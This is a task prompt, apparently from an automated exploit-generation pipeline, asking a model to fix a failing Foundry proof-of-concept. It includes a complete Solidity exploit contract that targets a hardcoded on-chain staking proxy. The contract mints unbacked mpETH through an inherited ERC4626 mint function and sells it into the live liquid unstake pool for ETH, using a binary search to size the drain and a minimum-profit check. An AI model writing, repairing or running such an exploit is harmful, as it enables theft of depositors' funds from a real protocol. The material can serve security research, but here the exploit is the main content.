You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Transparent proxies can retain a second upgrade path when paired with implementation-side upgrade logic
- claim: `TransparentUpgradeableProxy` only intercepts admin calls; every non-admin call is delegated to the implementation. Because transparent proxies and implementation-side upgrade patterns such as UUPS mutate the same ERC-1967 implementation slot, any upgrade entrypoint exposed by the implementation remains callable through the proxy by non-admin users and can change the proxy implementation outside the `ProxyAdmin` surface.
- impact: A deployment that assumes `ProxyAdmin` is the sole upgrade authority can accidentally leave a parallel upgrade surface reachable through the implementation. If the implementation's upgrade authorization is weak, bypassable, or left uninitialized, an attacker can replace the proxy logic and seize proxy-held assets or permissions.
- exploit_paths: ["A `TransparentUpgradeableProxy` is deployed pointing at an implementation that exposes `upgradeTo`/`upgradeToAndCall`-style logic.", "A non-admin caller invokes that implementation-defined upgrade function through the proxy, so `TransparentUpgradeableProxy._fallback()` forwards the call instead of handling it as an admin action.", "The implementation-side upgrade routine writes the shared ERC-1967 implementation slot, changing proxy logic without going through `ProxyAdmin`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStakingLike is IERC20Like {
    function mint(uint256 shares, address receiver) external returns (uint256);
    function liquidUnstakePool() external view returns (address);
}

interface ILiquidUnstakePoolLike {
    function getAmountOut(uint256 amountIn) external view returns (uint256 amountOut, uint256 feeAmount);
    function swapmpETHforETH(uint256 amount, uint256 minOut) external returns (uint256);
}

contract FlawVerifier {
    address internal constant TARGET_PROXY = 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710;
    uint256 internal constant MIN_SHARES = 0.01 ether;
    uint256 internal constant MIN_REQUIRED_PROFIT = 0.1 ether;

    address internal realizedProfitToken;
    uint256 internal realizedProfitAmount;

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 nativeBefore = address(this).balance;
        uint256 mpEthBefore = _balanceOf(TARGET_PROXY, address(this));

        // The supplied logs already prove the original UUPS-style hypothesis is infeasible at this fork:
        // the transparent proxy delegates into a verified `Staking` implementation that does not expose
        // `upgradeTo` / `upgradeToAndCall`. Because path stage 1 is absent on-chain here, the live profit
        // route is the implementation function that *is* reachable through the same proxy fallback: the
        // inherited ERC4626 `mint(uint256,address)` entrypoint.
        //
        // `Staking` overrides `_deposit` but forgets to pull any assets for the inherited `mint` flow, so a
        // non-admin caller can mint unbacked mpETH through the proxy and immediately sell it into the live
        // liquid unstake pool for ETH.
        address liquidPool = IStakingLike(TARGET_PROXY).liquidUnstakePool();
        require(liquidPool != address(0), "liquid pool missing");

        uint256 desiredShares = _findLargestSwappableAmount(liquidPool);
        require(desiredShares >= MIN_SHARES, "no swappable amount");

        IStakingLike(TARGET_PROXY).mint(desiredShares, address(this));

        uint256 mintedShares = _balanceOf(TARGET_PROXY, address(this)) - mpEthBefore;
        require(mintedShares != 0, "mint produced no shares");

        (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, mintedShares);
        require(quoteOk && quotedOut >= MIN_REQUIRED_PROFIT, "insufficient quote");

        _safeApprove(TARGET_PROXY, liquidPool, mintedShares);
        ILiquidUnstakePoolLike(liquidPool).swapmpETHforETH(mintedShares, quotedOut);

        realizedProfitToken = address(0);
        realizedProfitAmount = address(this).balance - nativeBefore;
        require(realizedProfitAmount >= MIN_REQUIRED_PROFIT, "profit below threshold");
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function _findLargestSwappableAmount(address liquidPool) internal view returns (uint256 bestAmount) {
        uint256 poolEth = liquidPool.balance;
        if (poolEth < MIN_REQUIRED_PROFIT) {
            return 0;
        }

        uint256 low = MIN_SHARES;
        uint256 high = poolEth * 2;
        if (high < low) {
            high = low;
        }

        while (low <= high) {
            uint256 mid = low + (high - low) / 2;
            (bool ok, uint256 amountOut) = _quoteSwap(liquidPool, mid);
            if (ok && amountOut >= MIN_REQUIRED_PROFIT) {
                bestAmount = mid;
                low = mid + 1;
            } else {
                if (mid == 0) {
                    break;
                }
                high = mid - 1;
            }
        }
    }

    function _quoteSwap(address liquidPool, uint256 amountIn) internal view returns (bool ok, uint256 amountOut) {
        bytes memory data;
        (ok, data) = liquidPool.staticcall(
            abi.encodeWithSelector(ILiquidUnstakePoolLike.getAmountOut.selector, amountIn)
        );
        if (!ok || data.length < 64) {
            return (false, 0);
        }
        (amountOut,) = abi.decode(data, (uint256, uint256));
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (ok && data.length >= 32) {
            balance = abi.decode(data, (uint256));
        }
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: transparentupgradeableproxy, transparentupgradeableproxy._fallback(), proxyadmin; generated code does not cover paths indexes: 1, 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
